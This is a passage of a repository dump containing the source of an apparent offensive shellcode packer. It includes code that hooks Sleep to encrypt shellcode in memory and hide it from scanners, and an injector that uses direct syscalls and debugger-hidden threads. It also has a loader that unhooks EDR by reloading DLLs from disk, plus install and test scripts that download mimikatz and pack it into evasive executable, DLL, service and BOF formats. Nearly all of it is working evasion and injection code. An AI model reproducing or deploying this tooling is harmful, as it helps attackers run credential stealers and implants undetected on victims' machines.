PAGE_EXECUTE_WRITECOPY, &oldProt)) {\n            #ifdef _DEBUG_\n                wprintf(L\"xor_region_and_change_protection: cannot change protection (PAGE_EXECUTE_WRITECOPY) for 0x%p, %d (last error: 0x%x)\\n\", allocation_base, region_size, GetLastError());\n                fflush(stdout);\n            #endif\n\n            ExitProcess(-1);\n        } else if (newProtection == PAGE_READWRITE) {\n            newProtection = PAGE_EXECUTE_WRITECOPY;\n        }\n    }\n\n    FlushInstructionCache((HANDLE)-1, allocation_base, region_size);\n    xor32(allocation_base, region_size, key);\n\n    if (!VirtualProtect(allocation_base, region_size, newProtection, &oldProt)) {\n        #ifdef _DEBUG_\n            wprintf(L\"xor_region_and_change_protection: cannot change protection for 0x%p, %d (last error: 0x%x)\\n\", allocation_base, region_size, GetLastError());\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n\n    FlushInstructionCache((HANDLE)-1, allocation_base, region_size);\n}\n\nvoid inline_hook_function(BOOL enable, char* addressToHook, void* jumpAddress) {\n#ifdef _WIN64\n    unsigned char trampoline[] = {\n        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr\n        0x41, 0xFF, 0xE2                                            // jmp r10\n    };\n\n    memcpy(&trampoline[2], &jumpAddress, sizeof(jumpAddress));\n#else\n    unsigned char trampoline[] = {\n        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr\n        0xFF, 0xE0                        // jmp eax\n    };\n\n    memcpy(&trampoline[1], &jumpAddress, sizeof(jumpAddress));\n#endif\n\n    DWORD trampolineLength = sizeof(trampoline);\n    DWORD oldProt = 0;\n\n    if (VirtualProtect(addressToHook, trampolineLength, PAGE_EXECUTE_READWRITE, &oldProt)) {\n        if (enable) {\n            memcpy(originalBytes, addressToHook, trampolineLength);\n            memcpy(addressToHook, trampoline, trampolineLength);\n        } else {\n            memcpy(addressToHook, originalBytes, trampolineLength);\n        }\n    } else {\n        #ifdef _DEBUG_\n            wprintf(L\"inline_hook_function: cannot change protection for 0x%p\\n\", addressToHook);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n\n    FlushInstructionCache((HANDLE)-1, addressToHook, trampolineLength);\n\n    if (!VirtualProtect(addressToHook, trampolineLength, oldProt, &oldProt)) {\n        #ifdef _DEBUG_\n            wprintf(L\"inline_hook_function: cannot change protection for 0x%p\\n\", addressToHook);\n            fflush(stdout);\n        #endif\n        ExitProcess(-1);\n    }\n}\n\n#ifdef FLUCTUATE_NA\nLONG VEHHandler(PEXCEPTION_POINTERS pExceptInfo) {\n    #ifdef _WIN64\n        void* caller = (void*)pExceptInfo->ContextRecord->Rip;\n    #else\n        void* caller = (void*)pExceptInfo->ContextRecord->Eip;\n    #endif\n    if (pExceptInfo->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION /*0xc0000005*/) {\n        #ifdef _DEBUG_\n            wprintf(L\"VEHHandler: STATUS_ACCESS_VIOLATION at 0x%p\\n\", caller);\n            fflush(stdout);\n        #endif\n\n        if (is_shellcode_thread(caller)) {\n            #ifdef _DEBUG_\n                puts(\"VEHHandler: restoring original protection\");\n                fflush(stdout);\n            #endif\n\n            xor_region_and_change_protection(caller, XOR_KEY, originalProtection);\n            return EXCEPTION_CONTINUE_EXECUTION;\n        }\n    }\n\n    #ifdef _DEBUG_\n        wprintf(L\"unhandled exception: 0x%x\\n\", pExceptInfo->ExceptionRecord->ExceptionCode);\n        fflush(stdout);\n    #endif\n\n    return EXCEPTION_CONTINUE_SEARCH;\n}\n#endif\n\nvoid hook_sleep(BOOL enable);\n\nvoid my_sleep(DWORD dwMilliseconds) {\n    // const LPVOID caller = _ReturnAddress();\n    void* caller = __builtin_extract_return_addr(__builtin_return_address(0));\n    // PULONG_PTR overwrite = (PULONG_PTR)_AddressOfReturnAddress();\n    //unsigned int* overwrite = *((unsigned int**)__builtin_frame_address(0)) + 1;\n\n    #ifdef _DEBUG_\n        wprintf(L\"my_sleep: called with %d milliseconds by 0x%p\\n\", dwMilliseconds, caller);\n        fflush(stdout);\n    #endif\n\n    if (is_shellcode_thread(caller)) {\n        #ifdef _DEBUG_\n            wprintf(L\"my_sleep: caller 0x%p is from shellcode\\n\", caller);\n            fflush(stdout);\n        #endif\n        originalProtection = get_protection_from_pointer(caller);\n        #ifdef FLUCTUATE_RW\n            xor_region_and_change_protection(caller, XOR_KEY, PAGE_READWRITE);\n        #elif FLUCTUATE_NA\n            xor_region_and_change_protection(caller, XOR_KEY, PAGE_NOACCESS);\n        #endif\n    }\n\n    hook_sleep(FALSE);\n\n    #ifdef _DEBUG_\n        wprintf(L\"my_sleep: sleeping for %d milliseconds\\n\", dwMilliseconds);\n        fflush(stdout);\n    #endif\n\n    Sleep(dwMilliseconds);\n\n    if (is_shellcode_thread(caller)) {\n        #ifdef FLUCTUATE_RW\n            xor_region_and_change_protection(caller, XOR_KEY, originalProtection);\n        #endif\n    }\n\n    hook_sleep(TRUE);\n}\n\nvoid hook_sleep(BOOL enable) {\n    inline_hook_function(enable, (char*)&Sleep, (void*)&my_sleep);\n}\n\nvoid register_vectored_handler() {\n    #ifdef FLUCTUATE_NA\n        #ifdef _DEBUG_\n            puts(\"register_vectored_handler: adding vectored exception handler\");\n        #endif\n        AddVectoredExceptionHandler(1, &VEHHandler);\n    #endif\n}\n\nvoid fluctuate() {\n    XOR_KEY = generate_random_int();\n    #ifdef FLUCTUATE_NA\n        register_vectored_handler();\n    #endif\n    #ifdef _DEBUG_\n        puts(\"fluctuate: hooking Sleep\");\n    #endif\n    hook_sleep(TRUE);\n}\n"
        },
        {
          "name": "fluctuate.hpp",
          "type": "blob",
          "size": 0.193359375,
          "content": "#ifndef _FLUCTUATE_HPP_\n#define _FLUCTUATE_HPP_\n\n#include <windows.h>\n#include <memoryapi.h>\n#include <cstdlib>\n#include <ctime>\n#ifdef _DEBUG_\n#include <iostream>\n#endif\n\nvoid fluctuate();\n\n#endif\n"
        },
        {
          "name": "inject.cpp",
          "type": "blob",
          "size": 8.5556640625,
          "content": "#pragma clang diagnostic ignored \"-Wnested-anon-types\"\n#pragma clang diagnostic ignored \"-Wgnu-anonymous-struct\"\n\n#include \"inject.hpp\"\n\n#ifdef SYSCALLS\n    #include \"deps/inline_syscall/include/in_memory_init.hpp\"\n#endif\n\n#define NT_FAIL(status) (status < 0)\n\n#ifdef _BOF_\n#pragma clang diagnostic ignored \"-Wdollar-in-identifier-extension\"\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI void KERNEL32$Sleep(\n  DWORD dwMilliseconds\n);\n#define Sleep KERNEL32$Sleep\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI LPVOID KERNEL32$VirtualAllocEx(\n  HANDLE hProcess,\n  LPVOID lpAddress,\n  SIZE_T dwSize,\n  DWORD  flAllocationType,\n  DWORD  flProtect\n);\n#define VirtualAllocEx KERNEL32$VirtualAllocEx\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$VirtualProtectEx(\n  HANDLE hProcess,\n  LPVOID lpAddress,\n  SIZE_T dwSize,\n  DWORD  flNewProtect,\n  PDWORD lpflOldProtect\n);\n#define VirtualProtectEx KERNEL32$VirtualProtectEx\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI BOOL KERNEL32$WriteProcessMemory(\n  HANDLE  hProcess,\n  LPVOID  lpBaseAddress,\n  LPCVOID lpBuffer,\n  SIZE_T  nSize,\n  SIZE_T  *lpNumberOfBytesWritten\n);\n#define WriteProcessMemory KERNEL32$WriteProcessMemory\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI HANDLE KERNEL32$CreateRemoteThread(\n  HANDLE                 hProcess,\n  LPSECURITY_ATTRIBUTES  lpThreadAttributes,\n  SIZE_T                 dwStackSize,\n  LPTHREAD_START_ROUTINE lpStartAddress,\n  LPVOID                 lpParameter,\n  DWORD                  dwCreationFlags,\n  LPDWORD                lpThreadId\n);\n#define CreateRemoteThread KERNEL32$CreateRemoteThread\n\nextern \"C\" DECLSPEC_IMPORT WINBASEAPI WINAPI DWORD KERNEL32$WaitForSingleObject(\n  HANDLE hHandle,\n  DWORD  dwMilliseconds\n);\n#define WaitForSingleObject KERNEL32$WaitForSingleObject\n#endif\n\nvoid my_init_syscalls_list(void) {\n    #ifdef SYSCALLS\n    jm::init_syscalls_list();\n    #endif\n}\n\ntypedef void* (*funcPtr)();\n\nvoid executor(funcPtr shellcode) {\n    (*shellcode)();\n}\n\nLPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time) {\n    #ifdef _DEBUG_\n        if (sleep_time > 0)\n            wprintf(L\"sleeping for %d seconds!\\n\", sleep_time);\n    #endif\n    #ifdef SYSCALLS\n        NTSTATUS status = STATUS_PENDING;\n        LARGE_INTEGER li_sleep_time;\n        li_sleep_time.QuadPart = -((long long)sleep_time * 10000000);\n        status = INLINE_SYSCALL(NtDelayExecution)(TRUE, &li_sleep_time);\n        if (NT_FAIL(status)) {\n            #ifdef _DEBUG_\n                wprintf(L\"ERROR: NtDelayExecution = 0x%x\\n\", status);\n            #endif\n            return NULL;\n        }\n    #else\n        Sleep(sleep_time);\n    #endif\n\n    #ifdef FLUCTUATE\n        fluctuate();\n    #endif\n\n    #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)\n        funcPtr func = (funcPtr)shellcode;\n        *phThread = 0;\n        #ifdef _DEBUG_\n            puts(\"self executing the payload in .text\");\n        #endif\n        executor(func);\n\treturn NULL;\n    #else\n        void* allocation = nullptr;\n        #ifdef SYSCALLS\n            status = INLINE_SYSCALL(NtAllocateVirtualMemory)(\n                (HANDLE)-1,\n                &allocation,\n                0,\n                &size,\n                MEM_RESERVE | MEM_COMMIT,\n                #ifdef RX\n                PAGE_READWRITE);\n                #else\n                PAGE_EXECUTE_READWRITE);\n                #endif\n            if (NT_FAIL(status) || !allocation)\n            {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: NtAllocateVirtualMemory = 0x%x\\n\", status);\n                #endif\n                return NULL;\n            }\n        #else\n            allocation = VirtualAllocEx(\n                (HANDLE)-1,\n                0,\n                size,\n                MEM_RESERVE | MEM_COMMIT,\n                #ifdef RX\n                PAGE_READWRITE);\n                #else\n                PAGE_EXECUTE_READWRITE);\n                #endif\n            if (!allocation)\n            {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: VirtualAllocEx = 0x%x\\n\", GetLastError());\n                #endif\n                return NULL;\n            }\n        #endif\n\n        #ifdef _DEBUG_\n            wprintf(L\"Allocated rwx memory @ 0x%x\\n\", allocation);\n        #endif\n\n        SIZE_T bytesWritten = 0;\n\n        #ifdef SYSCALLS\n            status = INLINE_SYSCALL(NtWriteVirtualMemory)(\n                (HANDLE)-1,\n                allocation,\n                shellcode,\n                size,\n                &bytesWritten);\n\n            if (NT_FAIL(status) || bytesWritten < size)\n            {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: NtWriteVirtualMemory = 0x%x\\n\", status);\n                #endif\n                return NULL;\n            }\n        #else\n            BOOL res = WriteProcessMemory(\n                (HANDLE)-1,\n                allocation,\n                shellcode,\n                size,\n                &bytesWritten);\n\n            if (!res) {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: WriteProcessMemory = 0x%x\\n\", GetLastError());\n                #endif\n                return NULL;\n            }\n        #endif\n\n        #ifdef _DEBUG_\n            wprintf(L\"Written %d bytes of data @ 0x%x\\n\", bytesWritten, allocation);\n        #endif\n\n        #ifdef XOR_KEY\n            unsigned long max_length = 256;\n            char domain[256] = { 0 };\n            if (!GetComputerNameExA(ComputerNameDnsFullyQualified, domain, &max_length)) {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: GetComputerNameExA = 0x%x\\n\", GetLastError());\n                #endif\n            } else {\n                #ifdef _DEBUG_\n                wprintf(L\"GetComputerNameExA = %s\\n\", domain);\n                #endif\n            }\n\n            for (SIZE_T i = 0; i < size; i++) {\n                ((char*)allocation)[i] ^= domain[i % max_length];\n            }\n        #endif\n\n        #ifdef RX\n            DWORD old = 0;\n            #ifdef SYSCALLS\n            status = INLINE_SYSCALL(NtProtectVirtualMemory)(\n                (HANDLE)-1,\n                allocation,\n                size,\n                PAGE_EXECUTE_READ,\n                &old);\n\n            if (NT_FAIL(status) || old == 0)\n            {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: NtProtectVirtualMemory = 0x%x\\n\", status);\n                #endif\n                return NULL;\n            }\n            #else\n            res = VirtualProtectEx(\n                (HANDLE)-1,\n                allocation,\n                size,\n                PAGE_EXECUTE_READ,\n                &old);\n\n            if (!res) {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: VirtualProtectEx = 0x%x\\n\", GetLastError());\n                #endif\n                return NULL;\n            }\n            #endif\n        #endif\n\n        #ifdef SELFINJECT\n            typedef void* (*funcPtr)();\n            funcPtr func = (funcPtr)allocation;\n            *phThread = 0;\n            #ifdef _DEBUG_\n                puts(\"self executing the allocated payload\");\n            #endif\n            return (*func)();\n        #elif SYSCALLS\n            status = INLINE_SYSCALL(NtCreateThreadEx)(\n                phThread,\n                THREAD_ALL_ACCESS,\n                nullptr,\n                (HANDLE)-1,\n                (void*)executor,\n                allocation,\n                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,\n                0,\n                0,\n                0,\n                nullptr);\n\n            if (NT_FAIL(status) || !*phThread)\n            {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: NtCreateThreadEx = 0x%x\\n\", status);\n                #endif\n                return NULL;\n            }\n        #else\n            *phThread = CreateRemoteThread(\n                (HANDLE)-1,\n                NULL,\n                0,\n                (LPTHREAD_START_ROUTINE)executor,\n                allocation,\n                NULL,\n                NULL\n            );\n\n            if (!*phThread) {\n                #ifdef _DEBUG_\n                wprintf(L\"ERROR: CreateRemoteThread = 0x%x\\n\", GetLastError());\n                #endif\n                return NULL;\n            }\n        #endif\n\n        #ifdef _DEBUG_\n            wprintf(L\"Created thread #%d\\n\", *phThread);\n        #endif\n\n        if (wait) {\n            #ifdef _DEBUG_\n                wprintf(L\"Waiting for thread #%d\\n\", *phThread);\n            #endif\n            #ifdef SYSCALLS\n                INLINE_SYSCALL(NtWaitForSingleObject)(*phThread, TRUE, NULL);\n            #else\n                WaitForSingleObject(*phThread, -1);\n            #endif\n        }\n\n        return allocation;\n    #endif\n}\n"
        },
        {
          "name": "inject.hpp",
          "type": "blob",
          "size": 0.4365234375,
          "content": "#ifndef _INJECT_HPP_\n#define _INJECT_HPP_\n\n#include <windows.h>\n#ifdef _DEBUG_\n#include <iostream>\n#endif\n#include <unistd.h>\n#include <synchapi.h>\n#include <memoryapi.h>\n#include <cstdlib>\n#include <ctime>\n#include \"syscalls.hpp\"\n#ifdef FLUCTUATE\n#include \"fluctuate.hpp\"\n#endif\n\nvoid my_init_syscalls_list(void);\nLPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phThread, BOOL wait, unsigned int sleep_time);\n\n#endif\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 2.486328125,
          "content": "#!/usr/bin/env bash\n\nCURR_DIR=`pwd`\nINSTALL_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n\ncd $INSTALL_DIR &&\n\nsudo apt update &&\nsudo apt install -y python3-pip wget unzip build-essential cmake autotools-dev git clang golang mingw-w64 libcapstone-dev libssl-dev cowsay mono-devel wine64-tools &&\npip3 install --no-warn-script-location xortool &&\n\nmkdir -p deps &&\ncd deps &&\n\n(ls inline_syscall 2>/dev/null 1>&2 || (\n    git clone https://github.com/JustasMasiulis/inline_syscall.git &&\n    cd inline_syscall &&\n    git checkout 24238544b510d8f85ca38de3a43bc41fa8cfe380 &&\n    cd .. &&\n    grep -v '#include <intrin.h>' $INSTALL_DIR/deps/inline_syscall/include/in_memory_init.hpp > $INSTALL_DIR/deps/inline_syscall/include/in_memory_init.hpp2 &&\n    mv $INSTALL_DIR/deps/inline_syscall/include/in_memory_init.hpp2 $INSTALL_DIR/deps/inline_syscall/include/in_memory_init.hpp)\n) &&\n\n(ls donut 2>/dev/null 1>&2 || (git clone https://github.com/TheWover/donut.git && cd donut && make)\n) &&\n\n(ls keystone 2>/dev/null 1>&2 || (git clone --depth 1 https://github.com/keystone-engine/keystone.git &&\ncd keystone &&\nmkdir -p build &&\ncd build &&\ncmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DLLVM_TARGETS_TO_BUILD=\"X86\" -G \"Unix Makefiles\" .. &&\nmake &&\nsudo make install &&\ncd ../..)\n) &&\n\ngo install github.com/EgeBalci/sgn@latest &&\n\n(ls wclang 2>/dev/null 1>&2 || (git clone --depth 1 https://github.com/tpoechtrager/wclang.git &&\ncd wclang &&\ncmake -DCMAKE_INSTALL_PREFIX=_prefix_PEzor_ . &&\nmake &&\nsudo make install &&\ncd ..)\n) &&\n\ncd .. &&\n\nwget -O beacon.h https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h &&\n\n(grep -q _prefix_PEzor_ ~/.bashrc || echo \"export PATH=\\$PATH:~/.local/bin/:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/\") >> ~/.bashrc &&\n(grep -q _prefix_PEzor_ ~/.zshrc || echo \"export PATH=\\$PATH:~/.local/bin/:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/\") >> ~/.zshrc &&\n\nexport PATH=$PATH:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/ &&\n\nln -fs $INSTALL_DIR/PEzor.sh $INSTALL_DIR/PEzor &&\n\nchmod +x $INSTALL_DIR/PEzor &&\n\n$INSTALL_DIR/PEzor.sh -h &&\n\ncd $CURR_DIR &&\n\necho '[!] installation complete' &&\necho '[?] run the following command to update $PATH variable or restart your shell' &&\necho \"export PATH=\\$PATH:~/.local/bin/:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/\"\n"
        },
        {
          "name": "install.test.sh",
          "type": "blob",
          "size": 1.46484375,
          "content": "#!/usr/bin/env bash\n\nINSTALL_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n\n$INSTALL_DIR/install.sh --llvm &&\n\nexport PATH=$PATH:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/ &&\n\nwget -O mimikatz_trunk.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip &&\n\nunzip -d mimikatz mimikatz_trunk.zip &&\n\nbash -c \"$INSTALL_DIR/PEzor.sh -64 mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -format=dll mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -format=service-exe mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -format=service-dll mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -format=bof mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -debug mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -debug -sleep=120 mimikatz/x64/mimikatz.exe -z 2\" &&\nbash -c \"$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -antidebug -sleep=120 mimikatz/x64/mimikatz.exe -z 2\" &&\necho '[!] All tests done!'\n"
        },
        {
          "name": "loader.c",
          "type": "blob",
          "size": 19.4970703125,
          "content": "#include \"loader.h\"\n#include \"stdio.h\"\n\nvoid RefreshPE()\n{\n    HMODULE hModule;\n    PWSTR wszFullDllName;\n    PWSTR wszBaseDllName;\n    ULONG_PTR pDllBase;\n\n    __PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;\n    __PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;\n\n    OUTPUTDBGA(\"[*] Running DLLRefresher\\n\");\n\n    pLdteHead = GetInMemoryOrderModuleList();\n    pLdteCurrent = pLdteHead;\n\n    do {\n        if (pLdteCurrent->FullDllName.Length > 2)\n        {\n            wszFullDllName = pLdteCurrent->FullDllName.Buffer;\n            wszBaseDllName = pLdteCurrent->BaseDllName.Buffer;\n            pDllBase = (ULONG_PTR)pLdteCurrent->DllBase;\n\n            OUTPUTDBGA(\"[*] Refreshing DLL: \");\n            OUTPUTDBGW(wszBaseDllName);\n            OUTPUTDBGA(\"\\n\");\n\n            hModule = CustomLoadLibrary(wszFullDllName, wszBaseDllName, pDllBase);\n\n            if (hModule)\n            {\n                ScanAndFixModule((PCHAR)hModule, (PCHAR)pDllBase, wszBaseDllName);\n                VirtualFree(hModule, 0, MEM_RELEASE);\n            }\n        }\n        pLdteCurrent = (__PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;\n    } while (pLdteCurrent != pLdteHead);\n}\n\nHMODULE CustomLoadLibrary(const PWCHAR wszFullDllName, const PWCHAR wszBaseDllName, ULONG_PTR pDllBase)\n{\n    // File handles\n    HANDLE hFile = INVALID_HANDLE_VALUE;\n    HANDLE hMap = NULL;\n    PCHAR pFile = NULL;\n\n    // PE headers\n    PIMAGE_DOS_HEADER pDosHeader;\n    PIMAGE_NT_HEADERS pNtHeader;\n    PIMAGE_SECTION_HEADER pSectionHeader;\n\n    // Library \n    PCHAR pLibraryAddr = NULL;\n    DWORD dwIdx;\n\n    // Relocation\n    PIMAGE_DATA_DIRECTORY pDataDir;\n    PIMAGE_BASE_RELOCATION pBaseReloc;\n    ULONG_PTR pReloc;\n    DWORD dwNumRelocs;\n    ULONG_PTR pInitialImageBase;\n    PIMAGE_RELOC pImageReloc;\n\n    // Import\n    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;\n    PCHAR szDllName;\n    SIZE_T stDllName;\n    PWSTR wszDllName = NULL;\n    PWCHAR wsRedir = NULL;\n    // PWSTR wszRedirName = NULL;\n    SIZE_T stRedirName;\n    size_t stSize;\n\n    HMODULE hModule;\n    PIMAGE_THUNK_DATA pThunkData;\n    FARPROC* pIatEntry;\n\n    // ----\n    // Step 1: Map the file into memory\n    // ----\n    OUTPUTDBGA(\"[+] Opening file: \");\n    OUTPUTDBGW(wszFullDllName);\n    OUTPUTDBGA(\"\\n\");\n\n    hFile = CreateFileW(wszFullDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (hFile == INVALID_HANDLE_VALUE)\n        goto cleanup;\n\n    hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);\n    if (hMap == NULL)\n        goto cleanup;\n\n    pFile = (PCHAR)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);\n    if (pFile == NULL)\n        goto cleanup;\n\n    // ----\n    // Step 2: Parse the file headers and load it into memory\n    // ----\n    pDosHeader = (PIMAGE_DOS_HEADER)pFile;\n    pNtHeader = (PIMAGE_NT_HEADERS)(pFile + pDosHeader->e_lfanew);\n\n    // allocate memory to copy DLL into\n    OUTPUTDBGA(\"\\t[+] Allocating memory for library\\n\");\n    pLibraryAddr = (PCHAR)VirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n    // copy header\n    OUTPUTDBGA(\"\\t[+] Copying PE header into memory\\n\");\n    memcpy(pLibraryAddr, pFile, pNtHeader->OptionalHeader.SizeOfHeaders);\n\n    // copy sections\n    OUTPUTDBGA(\"\\t[+] Copying PE sections into memory\\n\");\n    pSectionHeader = (PIMAGE_SECTION_HEADER)(pFile + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));\n    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)\n    {\n        memcpy(pLibraryAddr + pSectionHeader[dwIdx].VirtualAddress,\n               pFile + pSectionHeader[dwIdx].PointerToRawData,\n               pSectionHeader[dwIdx].SizeOfRawData);\n    }\n\n    // update our pointers to the loaded image\n    pDosHeader = (PIMAGE_DOS_HEADER)pLibraryAddr;\n    pNtHeader = (PIMAGE_NT_HEADERS)(pLibraryAddr + pDosHeader->e_lfanew);\n\n    // ----\n    // Step 3: Calculate relocations\n    // ----\n    OUTPUTDBGA(\"\\t[+] Calculating file relocations\\n\");\n\n    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n    pInitialImageBase = pNtHeader->OptionalHeader.ImageBase;\n    \n    // set the ImageBase to the already loaded module's base\n    pNtHeader->OptionalHeader.ImageBase = pDllBase;\n\n    // check if their are any relocations present\n    if (pDataDir->Size)\n    {\n        // calculate the address of the first IMAGE_BASE_RELOCATION entry\n        pBaseReloc = (PIMAGE_BASE_RELOCATION)(pLibraryAddr + pDataDir->VirtualAddress);\n\n        // iterate through each relocation entry\n\t\twhile ((PCHAR)pBaseReloc < (pLibraryAddr + pDataDir->VirtualAddress + pDataDir->Size) && pBaseReloc->SizeOfBlock)\n\t\t{\n            // the VA for this relocation block\n            pReloc = (ULONG_PTR)(pLibraryAddr + pBaseReloc->VirtualAddress);\n\n            // number of entries in this relocation block\n            dwNumRelocs = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);\n\n            // first entry in the current relocation block\n            pImageReloc = (PIMAGE_RELOC)((PCHAR)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));\n\n            // iterate through each entry in the relocation block\n            while (dwNumRelocs--)\n            {\n                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.\n                // we subtract the initial ImageBase and add in the original dll base\n                if (pImageReloc->type == IMAGE_REL_BASED_DIR64)\n                {\n                    *(ULONG_PTR *)(pReloc + pImageReloc->offset) -= pInitialImageBase;\n                    *(ULONG_PTR *)(pReloc + pImageReloc->offset) += pDllBase;\n                }\n                else if (pImageReloc->type == IMAGE_REL_BASED_HIGHLOW)\n                {\n                    *(DWORD *)(pReloc + pImageReloc->offset) -= (DWORD)pInitialImageBase;\n                    *(DWORD *)(pReloc + pImageReloc->offset) += (DWORD)pDllBase;\n                }\n                else if (pImageReloc->type == IMAGE_REL_BASED_HIGH)\n                {\n                    *(WORD *)(pReloc + pImageReloc->offset) -= HIWORD(pInitialImageBase);\n                    *(WORD *)(pReloc + pImageReloc->offset) += HIWORD(pDllBase);\n                }\n                else if (pImageReloc->type == IMAGE_REL_BASED_LOW)\n                {\n                    *(WORD *)(pReloc + pImageReloc->offset) -= LOWORD(pInitialImageBase);\n                    *(WORD *)(pReloc + pImageReloc->offset) += LOWORD(pDllBase);\n                }\n                \n                // get the next entry in the current relocation block\n                pImageReloc = (PIMAGE_RELOC)((PCHAR)pImageReloc + sizeof(IMAGE_RELOC));\n            }\n\n            // get the next entry in the relocation directory\n            pBaseReloc = (PIMAGE_BASE_RELOCATION)((PCHAR)pBaseReloc + pBaseReloc->SizeOfBlock);\n        }\n    }\n\n    // ----\n    // Step 4: Update import table\n    // ----\n    OUTPUTDBGA(\"\\t[+] Resolving Import Address Table (IAT) \\n\");\n\n    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n    if (pDataDir->Size)\n    {\n        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLibraryAddr + pDataDir->VirtualAddress);\n\n        while (pImportDesc->Characteristics)\n        {\n            hModule = NULL;\n            wszDllName = NULL;\n            szDllName = (PCHAR)(pLibraryAddr + pImportDesc->Name);\n            stDllName = strnlen(szDllName, MAX_PATH);\n            wszDllName = (PWSTR)calloc(stDllName + 1, sizeof(WCHAR));\n\n            if (wszDllName == NULL)\n                goto next_import;\n\n            mbstowcs_s(&stSize, wszDllName, stDllName + 1, szDllName, stDllName);\n\n            OUTPUTDBGA(\"\\t\\t[+] Loading library: \");\n            OUTPUTDBGW(wszDllName);\n            OUTPUTDBGA(\"\\n\");\n\n            // If the DLL starts with api- or ext-, resolve the redirected name and load it\n            if (_wcsnicmp(wszDllName, L\"api-\", 4) == 0 || _wcsnicmp(wszDllName, L\"ext-\", 4) == 0)\n            {\n                // wsRedir is not null terminated\n                wsRedir = GetRedirectedName(wszBaseDllName, wszDllName, &stRedirName);\n                if (wsRedir)\n                {\n                    // Free the original wszDllName and allocate a new buffer for the redirected dll name\n                    free(wszDllName);\n                    wszDllName = (PWSTR)calloc(stRedirName + 1, sizeof(WCHAR));\n                    if (wszDllName == NULL)\n                        goto 